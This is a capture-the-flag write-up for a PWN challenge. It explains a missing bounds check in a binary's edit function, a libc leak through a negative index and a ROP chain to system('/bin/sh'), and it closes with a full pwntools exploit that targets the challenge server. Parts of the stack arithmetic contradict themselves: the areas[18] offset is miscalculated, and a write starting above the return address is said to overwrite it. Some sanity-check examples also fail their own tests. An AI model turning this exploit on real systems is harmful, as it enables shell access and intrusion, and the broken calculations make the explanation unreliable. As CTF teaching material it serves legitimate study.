# Imagemap Generator - Complete PWN Challenge Writeup

> **Challenge:** imagemap-generator (osuCTF 2025)  
> **Category:** PWN  
> **Difficulty:** Medium  
> **Flag:** `osu{i_st1ll_d0nt_get_imagemaps}`  


---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Initial Analysis](#initial-analysis)
3. [Understanding the Vulnerability](#understanding-the-vulnerability)
4. [Memory Layout Deep Dive](#memory-layout-deep-dive)
5. [Information Leak (Stage 1)](#information-leak-stage-1)
6. [Exploitation (Stage 2)](#exploitation-stage-2)
7. [Common Confusions & FAQs](#common-confusions--faqs)
8. [Complete Working Exploit](#complete-working-exploit)
9. [Key Takeaways](#key-takeaways)

---

## Challenge Overview

### What We're Given

- `generator` - The vulnerable binary
- `libc.so.6` - The C standard library used
- `Dockerfile` & `nsjail.cfg` - Server configuration
- Remote server: `imagemap-generator.challs.sekai.team:1337`

### What The Program Does

The program manages "areas" for an HTML imagemap. Features:
1. **Create area** - Add coordinates and metadata
2. **Remove area** - Delete an area
3. **Edit area** - Modify existing area
4. **Generate imagemap** - Output HTML
5. **Exit** - Close program

---

## Initial Analysis

### Step 1: Check File Type

```bash
file generator
```

**Output:**
```
generator: ELF 64-bit LSB executable, x86-64, dynamically linked
```

**What this means:**
- **64-bit binary** - Uses 8-byte addresses (important for exploit)
- **x86-64** - Intel/AMD processor architecture
- **Dynamically linked** - Uses external libraries (libc)

---

### Step 2: Security Protections

```bash
checksec generator
```

**Output:**
```
RELRO:      Partial RELRO
Stack:      No canary found    ← GOOD FOR US!
NX:         NX enabled          ← BAD FOR US
PIE:        No PIE (0x400000)   ← GOOD FOR US!
```

**Protection Analysis:**

| Protection | Status | What It Means | Impact on Exploit |
|------------|--------|---------------|-------------------|
| **Stack Canary** | Disabled | No "tripwire" to detect buffer overflow | ✅ We can overflow freely |
| **NX (No eXecute)** | Enabled | Stack memory cannot execute code | ❌ Can't inject shellcode - must use ROP |
| **PIE (Position Independent Executable)** | Disabled | Program always loads at 0x400000 | ✅ Program addresses are predictable |
| **ASLR** | Enabled (system-level) | Libc/stack addresses randomized | ❌ Need to leak addresses |

**Key Takeaways:**
- No canary = Buffer overflow possible
- NX enabled = Must use ROP (Return Oriented Programming)
- No PIE = Binary addresses fixed
- ASLR = Library addresses change each run

---

### Step 3: Run the Program

```bash
./generator
```

**Sample interaction:**
```
~-~-~ imagemap-generator ~-~-
Enter the image URL: http://test.com

menu:
1. create area
2. remove area
3. edit area
4. generate imagemap
5. exit
choice: 1
Enter the x coordinate: 10
Enter the y coordinate: 20
Enter the width: 100
Enter the height: 100
Enter the redirect URL: http://example.com
Enter the title: Test Area
Area created successfully! Total areas: 1
```

---

### Step 4: Analyze with Ghidra

**Main function (decompiled):**
```c
int main() {
    char image_url[0x400];     // 1024 bytes
    int count = 0;             // Number of areas
    Area areas[16];            // Array of 16 areas (16 × 544 = 8704 bytes)
    
    printf("Enter the image URL: ");
    fgets(image_url, 0x400, stdin);
    
    while (1) {
        // Print menu and get choice
        switch(choice) {
            case 1: create_area(areas, &count); break;
            case 3: edit_area(areas, &count); break;
            case 5: return 0;
        }
    }
}
```

**Area structure (from analysis):**
```c
struct Area {
    long x;                  // 8 bytes at offset +0x00
    long y;                  // 8 bytes at offset +0x08
    long width;              // 8 bytes at offset +0x10
    long height;             // 8 bytes at offset +0x18
    char redirect_url[256];  // 256 bytes at offset +0x20
    char title[256];         // 256 bytes at offset +0x120
};  // Total size: 544 bytes (0x220 in hex)
```

**How to find structure size:**
```bash
# In Ghidra, look for patterns like:
# add rax, 0x220  ← This shows each area is 0x220 bytes apart
```

---

## Understanding the Vulnerability

### The Bug: Missing Bounds Check

**Vulnerable function - `edit_area()`:**

```c
void edit_area(Area *areas, int *count) {
    int area_num;
    
    printf("Enter area number to edit (1-%d): ", *count);
    scanf("%d", &area_num);
    area_num = area_num - 1;  // Convert to 0-based index
    
    // ❌ CRITICAL BUG: No validation!
    // Missing: if (area_num < 0 || area_num >= *count) return;
    
    // Directly accesses memory without checking bounds
    printf("Enter new x coordinate (current: %ld): ", areas[area_num].x);
    scanf("%ld", &areas[area_num].x);
    // ... continues for y, width, height, URL, title
}
```

**The vulnerability:** No bounds checking on `area_num`!

Valid indices: 0-15 (since we have 16 areas)  
But we can use: **ANY** integer (negative or > 15)

---

### What This Bug Allows

#### 1. Out-of-Bounds Read (OOB Read)
```python
# Use negative index
edit_area(-3)  # Reads memory BEFORE the array
```
**Impact:** Can leak sensitive data like libc pointers

#### 2. Out-of-Bounds Write (OOB Write)
```python
# Use index beyond array
edit_area(18)  # Writes memory AFTER the array
```
**Impact:** Can overwrite return address → control program flow

---

### Array Indexing Math

**Formula:**
```
address_of_areas[index] = array_start + (index × element_size)
```

**Example calculations:**
```
Suppose arrays start at: 0x1000
Each area is: 0x220 bytes (544 decimal)

areas[0]  = 0x1000 + (0 × 0x220)  = 0x1000       ✓ Valid
areas[1]  = 0x1000 + (1 × 0x220)  = 0x1220       ✓ Valid
areas[15] = 0x1000 + (15 × 0x220) = 0x2DE0       ✓ Valid (last)

areas[-1] = 0x1000 + (-1 × 0x220) = 0xDE0        ✗ OOB (before)
areas[-3] = 0x1000 + (-3 × 0x220) = 0x9A0        ✗ OOB (before)

areas[16] = 0x1000 + (16 × 0x220) = 0x3000       ✗ OOB (after)
areas[18] = 0x1000 + (18 × 0x220) = 0x3440       ✗ OOB (after)
```

**Key Point:** The CPU doesn't care if the index is valid - it just does the math and accesses that memory!

---

## Memory Layout Deep Dive

### Finding Stack Layout with Assembly

**Disassemble main:**
```bash
gdb ./generator
(gdb) disassemble main
```

**Key instructions:**
```asm
0x401df1 <main+4>:    push   rbp                 ; Save old base pointer
0x401df2 <main+5>:    mov    rbp,rsp             ; Set new base pointer
0x401df5 <main+8>:    sub    rsp,0x1000          ; Allocate 4096 bytes
0x401e01 <main+20>:   sub    rsp,0x1000          ; Allocate 4096 bytes
0x401e0d <main+32>:   sub    rsp,0x610           ; Allocate 1552 bytes
```

**Total stack allocation:**
```
0x1000 + 0x1000 + 0x610 = 0x2610 bytes (9744 decimal)
```

**Variable locations (from assembly):**
```asm
0x401e84:  lea    rax,[rbp-0x400]       ; image_url buffer
0x401e5f:  mov    DWORD PTR [rbp-0x2604],0x0   ; count = 0
0x401f62:  lea    rax,[rbp-0x2600]      ; areas array start
```

---

### Complete Stack Layout Diagram

```
                    Higher Addresses
                          ↑
┌────────────────────────────────────┐
│  Return Address                    │  RBP + 0x8
│  (where to jump after main())      │  ← TARGET for exploitation!
├────────────────────────────────────┤
│  Saved RBP                         │  RBP + 0x0
│  (previous base pointer)           │
├────────────────────────────────────┤
│  ... other stack data ...          │
├────────────────────────────────────┤
│  image_url[1024 bytes]             │  RBP - 0x400
├────────────────────────────────────┤
│  count (4 bytes)                   │  RBP - 0x2604
├────────────────────────────────────┤
│  areas[15] (544 bytes)             │  
│    x, y, width, height             │
│    redirect_url[256]               │
│    title[256]                      │
├────────────────────────────────────┤
│  areas[14] (544 bytes)             │
├────────────────────────────────────┤
│  ... areas[13] to areas[1] ...     │
├────────────────────────────────────┤
│  areas[0] (544 bytes)              │  RBP - 0x2600
│    x (8 bytes)                     │  +0x00        ← Array starts here
│    y (8 bytes)                     │  +0x08
│    width (8 bytes)                 │  +0x10
│    height (8 bytes)                │  +0x18
│    redirect_url[256]               │  +0x20
│    title[256]                      │  +0x120
└────────────────────────────────────┘
                    Lower Addresses
                          ↓
```

**Distance calculation:**
```
Return address:  RBP + 0x8
Arrays start:    RBP - 0x2600
Distance:        0x2608 bytes

Number of areas to reach return: 0x2608 ÷ 0x220 ≈ 17.8
So areas[18] will reach the return address area!
```

---

## Information Leak (Stage 1)

### Why Do We Need a Leak?

**Our goal:** Call `system("/bin/sh")` to spawn a shell.

**The problem:**
1. `system()` function is in libc library
2. ASLR randomizes where libc loads in memory
3. We need to know where `system()` is to call it

**The solution:** 
1. Leak ANY address from libc
2. Calculate libc base address
3. Calculate where `system()` is located

---

### Understanding ASLR (Address Space Layout Randomization)

**Without ASLR:**
```
Run 1: libc base = 0x7ffff7a00000, system() = 0x7ffff7a50d70
Run 2: libc base = 0x7ffff7a00000, system() = 0x7ffff7a50d70
       ↑ Same every time!
```

**With ASLR (modern systems):**
```
Run 1: libc base = 0x7ffff7a00000, system() = 0x7ffff7a50d70
Run 2: libc base = 0x7ffff7c00000, system() = 0x7ffff7c50d70 ← Different!
Run 3: libc base = 0x7f8934200000, system() = 0x7f8934250d70 ← Different!
```

**Key insight:** The base changes, but the OFFSET stays the same!
```
system() is always 0x50d70 bytes from libc base
```

So if we know:
1. ONE address inside libc (leaked_address)
2. Its offset from base (offset)

We can calculate:
```
libc_base = leaked_address - offset
system() = libc_base + 0x50d70
```

---

### Real-World Analogy for Leaks

**Imagine:**
- You want to visit John (= `system()` function)
- John moves to a random house every day (= ASLR)
- But Bob (= some other libc function) always lives 5 houses away from John
- If you find Bob's address, you know: John = Bob - 5 houses

**In our exploit:**
- John = `system()` function (what we want to call)
- Bob = Some pointer at `areas[-3].height` (what we can leak)
- Distance = `0x21aaa0` offset (stays constant)

---

### Finding the Leak - Step by Step

#### Step 1: Testing Negative Indices Locally

First, we need to find which negative index contains libc pointers.

**Test script:**
```python
#!/usr/bin/env python3
from pwn import *
import subprocess, time

context.arch = "amd64"
elf = ELF('./generator')

p = process(elf.path)
p.sendlineafter(b'URL: ', b'http://test.com')

# Create one valid area
p.sendlineafter(b'choice: ', b'1')
for _ in range(4): p.sendlineafter(b': ', b'1')
p.sendlineafter(b'URL: ', b'http://test.com')
p.sendlineafter(b'title: ', b'test')

# Get actual libc base from /proc
time.sleep(0.2)
pid = p.pid
maps = subprocess.check_output(f"cat /proc/{pid}/maps | grep libc | head -1", shell=True).decode()
actual_base = int(maps.split('-')[0], 16)
log.info(f"Actual libc base: {hex(actual_base)}")

# Test each negative index
for idx in [-1, -2, -3, -4, -5]:
    log.info(f"\n=== Testing area {idx} ===")
    p.sendlineafter(b'choice: ', b'3')
    p.sendlineafter(b'edit', str(idx).encode())
    
    # Check each field
    for i, field in enumerate(['x', 'y', 'width', 'height']):
        if i > 0:
            p.sendline(b'1')  # Answer previous field
        
        data = p.recvuntil(b'): ')
        try:
            value = int(data.split(b'current: ')[-1].split(b')')[0])
            
            # Check if it's a libc address
            if 0x7f0000000000 < value < 0x7fff00000000:
                offset = value - actual_base
                log.success(f"{field}: {hex(value)} -- Offset: {hex(offset)}")
            else:
                log.info(f"{field}: {hex(value)}")
        except:
            log.warning(f"{field}: Parse failed")
    
    # Finish edit
    p.sendline(b'1')
    p.sendlineafter(b'): ', b'http://test.com')
    p.sendlineafter(b'): ', b'test')

p.close()
```

**Test results:**
```
=== Testing area -1 ===
x: Parse failed
y: 0x742f2f3a70747468
width: 0x6d6f632e747365
height: 0x0

=== Testing area -2 ===
All zeros

=== Testing area -3 ===  ← BINGO!
x: Parse failed
y: 0x0
width: 0x7fba27bbc8e0 -- Offset: 0x1e78e0   ✓ Libc address
height: 0x7fba27bbd5c0 -- Offset: 0x1e85c0  ✓ Libc address

=== Testing area -4 ===
y: 0x7ffc4a114f30 (stack address, not useful)
width: 0x7fba27bbd5c0 -- Offset: 0x1e85c0  ✓ Libc address
```

**Conclusion:** Area `-3` reliably contains libc pointers in both width and height fields!

---

#### Step 2: Understanding Which Field to Leak

The working solution uses the **HEIGHT** field. Here's why:

**The exploit code:**
```python
r.sendlineafter(b'): ', b'1')  # Answer for x
r.sendlineafter(b'): ', b'1')  # Answer for y
r.sendlineafter(b'): ', b'1')  # Answer for width ← Send this!
data = r.recvuntil(b'): ')     # ← Captures next prompt (height)
```

**What happens:**
```
1. Program asks: "Enter new x (current: 123): "
   We send: 1

2. Program asks: "Enter new y (current: 456): "
   We send: 1

3. Program asks: "Enter new width (current: 789): "
   We send: 1

4. Program asks: "Enter new height (current: 140737351847584): "
                                               ↑ THIS IS THE LEAK!
   We capture this line before answering
```

**Critical detail:** After we send the width value, we IMMEDIATELY call `recvuntil(b'): ')`. This captures the HEIGHT prompt, which displays the current value stored in `areas[-3].height` - a libc pointer!

---

#### Common Confusion #1: Width vs Height

**Q: Why does the script leak height and not width?**

**A:** Both work! The choice is arbitrary. The key is:
1. If leaking WIDTH: recv BEFORE sending width
2. If leaking HEIGHT: recv AFTER sending width (before sending height)

**Example leaking WIDTH instead:**
```python
r.sendlineafter(b'): ', b'1')  # x
r.sendlineafter(b'): ', b'1')  # y
data = r.recvuntil(b'): ')     # ← Captures width prompt
leaked = int(data.split(b'current: ')[-1].split(b')')[0])
r.sendline(b'1')               # Answer width
# Continue...
```

---

#### Step 3: Calculating the Offset

**Local testing showed:**
```
Leaked height value: 0x7fba27bbd5c0
Actual libc base:    0x7fba279d5000
Offset:              0x1e85c0
```

**But the remote server uses offset 0x21aaa0!**

**Why different?**
- Local and remote use different libc versions
- Different versions have different memory layouts
- The OFFSET depends on what the leaked pointer actually points to

**How did the writeup author find 0x21aaa0?**
1. Tested locally (found their offset)
2. Tried on remote
3. If it didn't work, tried nearby offsets
4. Found 0x21aaa0 works on remote

---

#### Common Confusion #2: How to Find the Right Offset

**Q: How do I know if my offset is correct?**

**A:** Check if the calculated libc base makes sense:

```python
leaked = 0x7e343da55aa0
libc_base = leaked - 0x21aaa0  # = 0x7e343d83b000

# Checks:
# 1. Starts with 0x7f (but not 0x7ffc or 0x7fff) ✓
# 2. Ends with 000 (page-aligned) ✓
# 3. Reasonable range (0x7f00... to 0x7fff...) ✓
```

**If any check fails, try different offsets:**
```python
for offset in [0x1e85c0, 0x21aaa0, 0x29aaa0, 0x1aaa0]:
    test_base = leaked - offset
    if test_base & 0xfff == 0:  # Check if page-aligned
        log.info(f"Offset {hex(offset)}: base = {hex(test_base)}")
```

---

#### Step 4: Finding system() and "/bin/sh"

Once we have libc base, we need two more addresses:

**1. Address of `system()` function:**
```bash
readelf -s libc.so.6 | grep " system"
```
Output:
```
1481: 0000000000050d70    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
```
So `system()` is at offset `0x50d70` from libc base.

**2. Address of "/bin/sh" string:**
```bash
strings -a -t x libc.so.6 | grep "/bin/sh"
```
Output:
```
1d8698 /bin/sh
```
So "/bin/sh" is at offset `0x1d8698` from libc base.

**Final calculation:**
```python
libc_base = leaked - 0x21aaa0
system_addr = libc_base + 0x50d70
binsh_addr = libc_base + 0x1d8698
```

---

### Summary of Stage 1 - The Leak

**What we do:**
1. Edit area `-3` (out of bounds read)
2. Leak the HEIGHT field value
3. Calculate: `libc_base = leaked - 0x21aaa0`
4. Calculate: `system_addr = libc_base + 0x50d70`
5. Calculate: `binsh_addr = libc_base + 0x1d8698`

**Now we know where everything is!**

---

## Exploitation (Stage 2)

### Goal: Overwrite Return Address with ROP Chain

**Our target:** The return address at `RBP + 0x8`

**Our tool:** Out-of-bounds write using area `18`

---

### Why Area 18?

**Calculation:**
```
Return address location:  RBP + 0x8
Arrays start:             RBP - 0x2600
Distance:                 0x2608 bytes

Number of areas:          0x2608 ÷ 0x220 = 17.78...

So areas[18] will overlap with the return address area!
```

**Which field of areas[18] reaches it?**
```
areas[18] starts at:  RBP - 0x2600 + (18 × 0x220) = RBP - 0x80
arrays[18].title:     RBP - 0x80 + 0x120 = RBP + 0xA0

If we write 200 bytes in title, we reach from RBP + 0xA0 to RBP + 0x168
This covers RBP + 0x8 (the return address)!
```

---

### What is ROP (Return Oriented Programming)?

**Problem:** NX is enabled - we can't execute code on the stack.

**Solution:** Reuse existing code snippets (gadgets) from libc!

**Key concept - The `ret` instruction:**
```asm
ret  ; Means: pop rip (jump to address on stack)
```

When a function returns:
1. CPU reads address from top of stack
2. Jumps to that address
3. Stack pointer moves up

**We control what's on the stack = We control where it jumps!**

---

### Understanding Gadgets

**A gadget** is a small piece of code ending with `ret`:

```asm
; Example gadget at 0x7ffff7a2a3e5:
pop rdi          ; Take value from stack → put in RDI register
ret              ; Jump to next address on stack
```

**What `pop rdi` does:**
```
Before:
  Stack: [0x12345678] ← RSP
  RDI:   [garbage]

After pop rdi:
  Stack: [next_value] ← RSP moved up
  RDI:   [0x12345678] ← Value moved here
```

**Why is this useful?**
In x86-64 calling convention, the first function argument goes in RDI.

So `pop rdi` lets us set the first argument to any value we want!

---

### Building the ROP Chain

**Goal:** Call `system("/bin/sh")`

In assembly, this is:
```asm
mov rdi, address_of_binsh_string
call system
```

**But we can't write assembly!** Instead, we chain gadgets:

```
Stack Layout (our ROP chain):
┌─────────────────────────┐
│ 200 bytes of 'A'        │ ← Padding to reach return address
├─────────────────────────┤
│ ret gadget              │ ← For stack alignment (optional)
├─────────────────────────┤
│ pop_rdi gadget address  │ ← 1. Jump here
├─────────────────────────┤
│ "/bin/sh" address       │ ← 2. This gets popped into RDI
├─────────────────────────┤
│ system() address        │ ← 3. Jump here with RDI="/bin/sh"
└─────────────────────────┘
```

**Execution flow:**
```
1. main() returns → Jumps to our pop_rdi gadget
2. pop_rdi executes → RDI now contains "/bin/sh" address
3. ret executes → Jumps to system()
4. system("/bin/sh") executes → SHELL! 🎉
```

---

### Finding Gadgets

**Find `pop rdi; ret` in libc:**
```bash
ROPgadget --binary libc.so.6 | grep "pop rdi ; ret"
```
Output:
```
0x000000000002a3e5: pop rdi ; ret
```

**Find `ret` gadget (for alignment):**
```bash
ROPgadget --binary libc.so.6 | grep ": ret$" | head -1
```
Output:
```
0x000000000002a3e6: ret
```

---

### Stack Alignment Issue

**Some functions require 16-byte stack alignment.**

`system()` on modern Linux needs: `RSP % 16 == 0`

**Symptom:** Exploit reaches system() but crashes.

**Solution:** Add an extra `ret` gadget before calling system.

**Why this works:**
```
Before ret:
  RSP = 0x7fffffffe008  (not aligned - ends in 8)

After ret:
  RSP = 0x7fffffffe010  (aligned - ends in 0!)
```

The extra `ret` shifts the stack by 8 bytes, achieving alignment.

---

### Building the Payload

**Manual method:**
```python
# Calculate addresses
libc_base = leaked - 0x21aaa0
pop_rdi = libc_base + 0x2a3e5
ret_gadget = libc_base + 0x2a3e6
system_addr = libc_base + 0x50d70
binsh_addr = libc_base + 0x1d8698

# Build ROP chain
payload = b'A' * 200           # Padding
payload += p64(ret_gadget)     # Alignment
payload += p64(pop_rdi)        # Set RDI
payload += p64(binsh_addr)     # "/bin/sh"
payload += p64(system_addr)    # Call system
```

**Pwntools method (easier):**
```python
libc.address = libc_base
rop = ROP(libc)
rop.raw(rop.find_gadget(['ret'])[0])  # Alignment
rop.call('system', [next(libc.search(b'/bin/sh\x00'))])

payload = b'A' * 200 + rop.chain()
```

**What `rop.call()` does automatically:**
1. Finds `pop rdi; ret` gadget
2. Finds `system()` address
3. Finds "/bin/sh" string
4. Builds the ROP chain correctly

---

### Triggering the Exploit

```python
# Edit area 18 (out of bounds!)
r.sendlineafter(b'choice: ', b'3')
r.sendlineafter(b'edit', b'18')

# Fill in other fields (doesn't matter)
for _ in range(4):
    r.sendlineafter(b'): ', b'1')

# Fill in URL
r.sendlineafter(b'): ', b'http://pwned.com')

# Send our ROP chain in the TITLE field!
payload = b'A' * 200 + rop.chain()
r.sendlineafter(b'): ', payload)

# Exit to trigger the return
r.sendlineafter(b'choice: ', b'5')

# Now main() returns and jumps to our ROP chain!
r.interactive()  # We should have a shell!
```

---

## Common Confusions & FAQs

### Q1: What does `context.arch = "amd64"` do?

**A:** Tells pwntools what processor architecture we're targeting.

```python
context.arch = "amd64"  # 64-bit x86 (Intel/AMD)
```

**Effects:**
- `p64()` packs 8-byte addresses correctly
- ROP gadget searching targets correct architecture
- Shellcode generation (if needed) uses correct instructions

**Other options:**
- `context.arch = "i386"` - 32-bit x86
- `context.arch = "arm"` - ARM processors
- `context.arch = "mips"` - MIPS processors

---

### Q2: How do we know padding is 200 bytes?

**A:** Through calculation or testing!

**Method 1: Calculate from memory layout**
(Complex - involves understanding exact stack layout)

**Method 2: Use GDB pattern (recommended)**
```bash
# In GDB with pwndbg:
pwndbg> pattern create 300

# Send this as the title, let it crash
# Check what's in RIP (the return address)
pwndbg> print $rip
# Suppose: 0x6161616161616162

# Find offset
pwndbg> pattern offset 0x6161616161616162
# Output: Found at offset 200
```

**Method 3: Binary search**
Try different values until we control RIP:
- Try 100 → RIP not controlled
- Try 300 → RIP controlled but wrong value
- Try 200 → RIP controlled perfectly!

---

### Q3: Why do addresses change between local and remote?

**A:** ASLR (Address Space Layout Randomization)

**Every time a program runs:**
- Stack base: Randomized
- Libc base: Randomized  
- Heap base: Randomized

**Example:**
```
Run 1: libc = 0x7ffff7a00000
Run 2: libc = 0x7ffff7c00000  ← Different!
Run 3: libc = 0x7f8934200000  ← Different!
```

**But offsets stay the same:**
```
system() always at: libc_base + 0x50d70
```

---

### Q4: What's the difference between local and remote offset?

**A:** Different libc versions!

**Your local system:**
```
Libc version: 2.35 (example)
Height offset: 0x1e85c0
```

**Remote server:**
```
Libc version: 2.31 (example)
Height offset: 0x21aaa0
```

**How to handle this:**
1. Test locally to understand the technique
2. Use the remote's known offset (0x21aaa0 from writeup)
3. If different, test various offsets until one works

---

### Q5: How do I know if I leaked a valid libc address?

**A:** Check these properties:

```python
leaked = 0x7e343da55aa0

# Check 1: Starts with 0x7f (but not 0x7ffc/0x7fff)
# Stack addresses: 0x7ffc??????  ✗
# Libc addresses:  0x7f???????   ✓

# Check 2: After subtracting offset, result ends in 000
libc_base = leaked - 0x21aaa0  # = 0x7e343d83b000
# Last 3 digits: 000 ✓ (page-aligned)

# Check 3: Reasonable range
if 0x7f0000000000 < libc_base < 0x7fff00000000:
    print("Valid!")
```

---

### Q6: Why use area -3 and not -1 or -2?

**A:** Because area -3 happens to contain libc pointers!

**Testing showed:**
```
area -1: Garbage string data
area -2: All zeros
area -3: Libc pointers ← Jackpot!
area -4: Mix of stack and libc
```

**The reason:** Memory layout from previous function calls left libc pointers at that location.

---

### Q7: What if the exploit doesn't work?

**Troubleshooting checklist:**

1. **Is the leaked address valid?**
   ```python
   # Should start with 0x7f (not 0x7ffc)
   if not (0x7f0000000000 < leaked < 0x7fff00000000):
       log.error("Invalid leak!")
   ```

2. **Is the calculated libc base correct?**
   ```python
   # Should end in 000
   if libc_base & 0xfff != 0:
       log.error("Not page-aligned!")
   ```

3. **Is the offset correct?**
   - Try different offsets: 0x21aaa0, 0x1e85c0, 0x29aaa0

4. **Stack alignment issue?**
   - Add extra `ret` gadgets

5. **Wrong area index?**
   - Try 17 or 19 instead of 18

6. **Wrong padding?**
   - Try 192, 208, 216 instead of 200

---

## Complete Working Exploit

```python
#!/usr/bin/env python3
"""
imagemap-generator exploit
Two-stage attack: Leak libc → ROP to system()
"""
from pwn import *

context.arch = "amd64"
context.log_level = "info"

# Load binaries
elf = ELF('./generator')
libc = ELF('./libc.so.6')

# Connect to target
# For local: p = process(elf.path)
# For remote:
p = remote("imagemap-generator.challs.sekai.team", 1337)

# ========== STAGE 1: LEAK LIBC ==========
log.info("Stage 1: Leaking libc base address")

# Initial setup
p.sendlineafter(b'URL: ', b'1')

# Create one valid area (required)
p.sendlineafter(b'choice: ', b'1')
p.sendlineafter(b'coordinate: ', b'1')  # x
p.sendlineafter(b'coordinate: ', b'1')  # y
p.sendlineafter(b'width: ', b'1')
p.sendlineafter(b'height: ', b'1')
p.sendlineafter(b'URL: ', b'1')
p.sendlineafter(b'title: ', b'1')

# Leak via area -3
p.sendlineafter(b'choice: ', b'3')
p.sendlineafter(b'edit (1-1): ', b'-3')

# Navigate to height field
p.sendlineafter(b'): ', b'1')  # x
p.sendlineafter(b'): ', b'1')  # y
p.sendlineafter(b'): ', b'1')  # width

# Capture height (the leak!)
data = p.recvuntil(b'): ')
leaked = int(data.split(b'current: ')[-1].split(b')')[0])

# Calculate libc base
libc_base = leaked - 0x21aaa0

log.success(f"Leaked: {hex(leaked)}")
log.success(f"Libc base: {hex(libc_base)}")

# Validate
if not (0x700000000000 < libc_base < 0x800000000000):
    log.error("Invalid libc base!")
    exit(1)

# Complete the edit
p.sendline(b'1')  # height
p.sendlineafter(b'): ', b'1')  # url
p.sendlineafter(b'): ', b'1')  # title

# ========== STAGE 2: EXPLOIT ==========
log.info("Stage 2: Building ROP chain")

# Set libc base
libc.address = libc_base

# Build ROP chain (pwntools method)
rop = ROP(libc)
rop.raw(rop.find_gadget(['ret'])[0])  # Stack alignment
rop.call('system', [next(libc.search(b'/bin/sh\x00'))])

log.info(f"ROP chain: {rop.chain().hex()}")

# Trigger the exploit via area 18
p.sendlineafter(b'choice: ', b'3')
p.sendlineafter(b'edit', b'18')

# Fill in coordinates (doesn't matter)
for _ in range(4):
    p.sendlineafter(b'): ', b'1')

# Fill in URL
p.sendlineafter(b'): ', b'http://pwned.com')

# Send payload in title field
payload = b'A' * 200 + rop.chain()
p.sendlineafter(b'): ', payload)

# Exit to trigger ROP chain
p.sendlineafter(b'choice: ', b'5')

log.success("Exploit complete! Enjoy your shell!")

# Interact with shell
p.interactive()
```

---

## Key Takeaways

### Core Concepts Learned

1. **Out-of-Bounds Access**
   - Missing bounds check = Read/write anywhere
   - Negative indices access memory before array
   - Large indices access memory after array

2. **Information Leaks**
   - ASLR randomizes addresses each run
   - Leaking one address reveals entire library
   - Offsets stay constant even when addresses change

3. **ROP (Return Oriented Programming)**
   - NX prevents shellcode execution
   - Reuse existing code snippets (gadgets)
   - Chain gadgets to achieve arbitrary computation

4. **Stack Layout**
   - Understanding memory layout is crucial
   - Return address is the target for control flow hijack
   - Calculate distances to find correct indices

5. **64-bit Exploitation**
   - 8-byte addresses (use `p64()`)
   - Function arguments in registers (RDI, RSI, RDX, ...)
   - Stack alignment matters (16-byte boundary)

---

### Methodology for Future Challenges

1. **Reconnaissance**
   - Check security protections (`checksec`)
   - Run and interact with program
   - Analyze in disassembler (Ghidra/IDA)

2. **Find Vulnerability**
   - Look for missing bounds checks
   - Test edge cases (negative numbers, large numbers)
   - Check for buffer overflows

3. **Information Gathering**
   - Leak addresses if ASLR enabled
   - Calculate offsets locally
   - Find gadgets in binaries/libraries

4. **Develop Exploit**
   - Build ROP chain carefully
   - Test locally first
   - Adjust offsets/padding as needed

5. **Debug Issues**
   - Use GDB to see what's happening
   - Check if addresses are valid
   - Verify calculations

---

### Important Commands Reference

```bash
# Security checks
checksec generator

# Find function offsets
readelf -s libc.so.6 | grep system

# Find strings
strings -a -t x libc.so.6 | grep "/bin/sh"

# Find gadgets
ROPgadget --binary libc.so.6 | grep "pop rdi"

# Check memory maps
cat /proc/$(pgrep generator)/maps

# GDB debugging
gdb ./generator
(gdb) break main
(gdb) run
(gdb) disassemble main
(gdb) info proc mappings
(gdb) x/20gx $rsp
```

---

### Tools Used

- **pwntools** - Python library for exploitation
- **pwndbg** - GDB plugin for exploit development
- **Ghidra** - Reverse engineering tool
- **ROPgadget** - Find ROP gadgets
- **checksec** - Check binary protections

---

## Conclusion

This challenge taught us:
- How to exploit missing bounds checks
- Information leak techniques
- ROP chain construction
- Debugging and troubleshooting exploits

The two-stage attack (leak + exploit) is a common pattern in modern PWN challenges where ASLR is enabled.

**Final Flag:** `osu{i_st1ll_d0nt_get_imagemaps}`

